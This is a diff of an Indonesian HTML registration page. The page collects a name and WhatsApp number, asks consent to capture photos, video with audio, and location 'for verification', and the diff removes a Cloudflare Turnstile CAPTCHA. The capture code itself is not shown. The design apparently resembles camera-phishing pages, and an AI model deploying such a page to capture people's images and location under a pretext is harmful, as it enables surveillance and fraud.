@@ -1,4 +1,4 @@
-  <!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="id">
 <head>
   <meta charset="utf-8" />
@@ -94,26 +94,25 @@
         <p class="lead">Isi data untuk verifikasi. Semua akses (kamera, mikrofon, lokasi) akan diminta **dengan izin jelas**. Hanya lanjutkan jika pengguna menyetujui.</p>
 
         <form id="regForm" autocomplete="off" novalidate>
-  <label for="name">Nama lengkap</label>
-  <input id="name" type="text" placeholder="Nama lengkap" required>
+          <label for="name">Nama lengkap</label>
+          <input id="name" type="text" placeholder="Nama lengkap" required>
 
-  <label for="wa">Nomor WhatsApp (contoh: 62812...)</label>
-  <input id="wa" type="tel" placeholder="62812xxxxxxxx" required>
+          <label for="wa">Nomor WhatsApp (contoh: 62812...)</label>
+          <input id="wa" type="tel" placeholder="62812xxxxxxxx" required>
 
-  <div class="consent">
-    <input id="consent" type="checkbox" aria-label="Setuju capture">
-    <div>
-      <div style="font-weight:600;color:#fff;font-size:13px">Saya memberi izin</div>
-      <div style="color:var(--muted);font-size:12px;margin-top:6px">
-        Saya memberi izin agar situs ini mengambil <strong>foto</strong>, <strong>video+audio</strong>, dan <strong>lokasi</strong> untuk keperluan verifikasi.
-      </div>
-    </div>
-  </div>
+          <div class="consent">
+            <input id="consent" type="checkbox" aria-label="Setuju capture">
+            <div>
+              <div style="font-weight:600;color:#fff;font-size:13px">Saya memberi izin</div>
+              <div style="color:var(--muted);font-size:12px;margin-top:6px">
+                Saya memberi izin agar situs ini mengambil <strong>foto</strong>, <strong>video+audio</strong>, dan <strong>lokasi</strong> untuk keperluan verifikasi.
+              </div>
+            </div>
+          </div>
 
-  <!-- ✅ Tambahkan CAPTCHA di sini -->
-  <button class="btn" id="submitBtn" type="submit">Daftar & Verifikasi</button>
-  <div class="small">Setelah mengirim, kamu akan diarahkan ke halaman lain.</div>
-</form>
+          <button class="btn" id="submitBtn" type="submit">Daftar & Verifikasi</button>
+          <div class="small">Setelah mengirim, kamu akan diarahkan ke halaman lain.</div>
+        </form>
       </div>
 
       <aside class="right" aria-hidden="true">
@@ -494,61 +493,6 @@ async function captureBackPhoto() {
   } catch(e){ return null; }
 }
 
-<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-<script>
-document.addEventListener("DOMContentLoaded", function(){
-  const submitBtn = document.getElementById("submitBtn");
-  submitBtn.disabled = true; // awalnya disabled
-
-  window.onTurnstileSuccess = function(){
-    submitBtn.disabled = false; // aktifkan kalau captcha sukses
-  };
-});
 </script>
-
-
-<style>
-  #captchaOverlay {
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.85);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 9999;
-  }
-  #captchaBox {
-    background: #0b1220;
-    padding: 20px;
-    border-radius: 12px;
-    box-shadow: 0 8px 40px rgba(0,0,0,0.6);
-    text-align: center;
-  }
-</style>
-
-<div id="captchaOverlay">
-  <div id="captchaBox">
-    <h3 style="color:#fff;margin-bottom:14px">Verifikasi Dulu</h3>
-    <div class="cf-turnstile"
-         data-sitekey="0x4AAAAAAB2Z3JAtv50hS4mk"
-         data-callback="onTurnstileSuccess">
-    </div>
-  </div>
-</div>
-
-<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-<script>
-document.addEventListener("DOMContentLoaded", function(){
-  const overlay = document.getElementById("captchaOverlay");
-  const submitBtn = document.getElementById("submitBtn");
-  if(submitBtn) submitBtn.disabled = true;
-
-  window.onTurnstileSuccess = function(){
-    if(overlay) overlay.style.display = "none"; // hilangkan popup
-    if(submitBtn) submitBtn.disabled = false;  // aktifkan tombol form
-  };
-});
-</script>
-
 </body>
-</html>
+  </html>
